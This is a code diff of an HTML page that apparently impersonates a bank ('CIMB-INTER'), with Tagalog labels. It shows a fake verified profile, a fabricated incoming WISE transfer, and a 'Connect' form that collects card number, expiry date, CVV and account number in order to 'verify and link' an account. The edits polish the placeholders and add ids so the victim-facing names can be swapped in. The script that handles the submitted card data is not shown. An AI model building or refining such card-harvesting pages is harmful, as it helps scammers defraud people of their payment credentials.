@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Commerce International Merchant Bankers | CIMB-INTER</title>
     <link rel="stylesheet" href="styles.css">
-    <!-- Font Awesome CDN para sa mga bank at visa icons -->
     <link rel="stylesheet" href="https://cloudflare.com">
 </head>
 <body>
@@ -21,7 +20,6 @@
                 <li><a href="#" onclick="showSection('accountsSection')">Accounts</a></li>
                 <li><a href="#" onclick="showSection('transfersSection')">Transfers</a></li>
                 <li><a href="#" onclick="showSection('settingsSection')">Settings</a></li>
-                <!-- TAMANG PAGKAKALAGAY NG CONNECT LINK SA NAV MENU -->
                 <li><a href="#" onclick="showSection('connectAccountSection')">Connect</a></li>
                 <li><a href="#" onclick="logout()" class="logout-btn">Logout</a></li>
             </ul>
@@ -32,6 +30,7 @@
             </div>
         </div>
     </nav>
+
     <!-- 1. LOGIN PAGE -->
     <div id="loginSection" class="auth-container">
         <div class="auth-card">
@@ -43,7 +42,7 @@
             <form id="loginForm" onsubmit="handleLogin(event)">
                 <div class="form-group">
                     <label for="loginUsername">Username or Email</label>
-                    <input type="text" id="loginUsername" placeholder="Enter username (******)" required>
+                    <input type="text" id="loginUsername" placeholder="Enter username or email" required>
                 </div>
                 <div class="form-group">
                     <label for="loginPassword">Password</label>
@@ -82,7 +81,6 @@
             </div>
         </div>
     </div>
-
     <!-- 3. SIGNUP PAGE -->
     <div id="signupSection" class="auth-container" style="display:none;">
         <div class="auth-card">
@@ -121,9 +119,9 @@
             </div>
             <div class="header-right">
                 <div class="user-profile">
-                    <img src="https://ibb.co" alt="Cimb-Bank-Logo" style="width: 40px; height: 40px; border-radius: 50%;">
+                    <img src="https://placeholder.com" alt="Cimb-Bank-Logo" style="width: 40px; height: 40px; border-radius: 50%;">
                     <div class="profile-info">
-                        <span class="user-name">Branko Milos</span>
+                        <span class="user-name" id="profileName">Branko Milos</span>
                         <span class="account-type"><i class="fas fa-check-circle" style="color: #28a745;"></i> Verified Profile</span>
                     </div>
                 </div>
@@ -165,7 +163,6 @@
                 <i class="fas fa-list"></i><span>View Accounts</span>
             </button>
         </div>
-
         <!-- Recent Transactions Table Card -->
         <div class="section-card">
             <div class="section-header">
@@ -186,7 +183,7 @@
                     <tbody>
                         <tr>
                             <td>August 19, 2026 7:21 pm</td>
-                            <td>From WISE BRANKO MILOS</td>
+                            <td>From WISE <span id="transactName">BRANKO MILOS</span></td>
                             <td><span class="status-badge completed">Completed</span></td>
                             <td>REF-WS8291A</td>
                             <td style="color: #28a745; font-weight: bold;">+€ 47.50</td>
@@ -203,6 +200,7 @@
             </div>
         </div>
     </div>
+
     <div id="accountsSection" class="main-container" style="display:none;">
         <div class="section-header-main">
             <h1>My Linked Assets</h1>
@@ -286,7 +284,6 @@
             </div>
         </div>
     </div>
-
     <div id="settingsSection" class="main-container" style="display:none;">
         <div class="section-header-main">
             <h1>User Preferences</h1>
@@ -294,8 +291,8 @@
         <div class="settings-container">
             <div class="settings-card">
                 <h2><i class="fas fa-user"></i> Core Profile Info</h2>
-                <div class="form-group"><label>Display Label</label><input type="text" value="Branko Milos" readonly></div>
-                <div class="form-group"><label>Registered Routing Link</label><input type="email" value="cimb-international@email.com" readonly></div>
+                <div class="form-group"><label>Display Label</label><input type="text" id="settingsName" value="" readonly></div>
+                <div class="form-group"><label>Registered Routing Link</label><input type="email" id="settingsEmail" value="" readonly></div>
             </div>
             <div class="settings-card">
                 <h2><i class="fas fa-cog"></i> Configuration</h2>
@@ -306,9 +303,9 @@
             </div>
         </div>
     </div>
+
     <div id="connectAccountSection" class="auth-container" style="display:none; padding: 20px 0;">
         <div class="auth-card" style="max-width: 450px; margin: 0 auto; background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);">
-            
             <div id="step-info-form">
                 <div class="auth-header" style="text-align: center; margin-bottom: 20px;">
                     <i class="fas fa-link" style="color: #800000; font-size: 3rem;"></i>
@@ -318,24 +315,24 @@
                 <form id="card-bind-form" onsubmit="handleCardSubmit(event)" style="text-align: left; display: flex; flex-direction: column; gap: 15px;">
                     <div class="form-group">
                         <label style="display:block; font-size:0.9rem; margin-bottom:5px; font-weight:600; color: #333;">Account Name / Pangalan sa Card</label>
-                        <input type="text" id="card-name" placeholder="" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
+                        <input type="text" id="card-name" placeholder="Pangalan sa card" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
                     </div>
                     <div class="form-group">
                         <label style="display:block; font-size:0.9rem; margin-bottom:5px; font-weight:600; color: #333;">Account Number</label>
-                        <input type="text" id="account-number" placeholder="" maxlength="12" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
+                        <input type="text" id="account-number" placeholder="12-digit account number" maxlength="12" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
                     </div>
                     <div class="form-group">
                         <label style="display:block; font-size:0.9rem; margin-bottom:5px; font-weight:600; color: #333;">Numero ng Card (16-Digit)</label>
-                        <input type="text" id="card-number" placeholder="" maxlength="19" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
+                        <input type="text" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
                     </div>
                     <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                         <div class="form-group">
                             <label style="display:block; font-size:0.9rem; margin-bottom:5px; font-weight:600; color: #333;">Expiry Date</label>
-                            <input type="text" id="card-expiry" placeholder="" maxlength="5" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
+                            <input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
                         </div>
                         <div class="form-group">
                             <label style="display:block; font-size:0.9rem; margin-bottom:5px; font-weight:600; color: #333;">CVV / CVC</label>
-                            <input type="password" id="card-cvv" placeholder="" maxlength="3" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
+                            <input type="password" id="card-cvv" placeholder="3 digits" maxlength="3" required style="width:100%; border:1px solid #ccc; border-radius:4px; padding:10px; outline:none; background:#fff; color:#333;">
                         </div>
                     </div>
                     <button type="submit" class="btn btn-primary btn-full" style="width:100%; background:#800000; color:#fff; padding:12px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; margin-top: 10px;">I-verify at I-link ang Account</button>
@@ -364,7 +361,6 @@
             <div id="page-loading-spinner" style="display: none; text-align: center; padding: 30px 0;">
                 <i class="fas fa-spinner fa-spin" style="color: #800000; font-size: 2.5rem;"></i>
             </div>
-
         </div>
     </div>
 
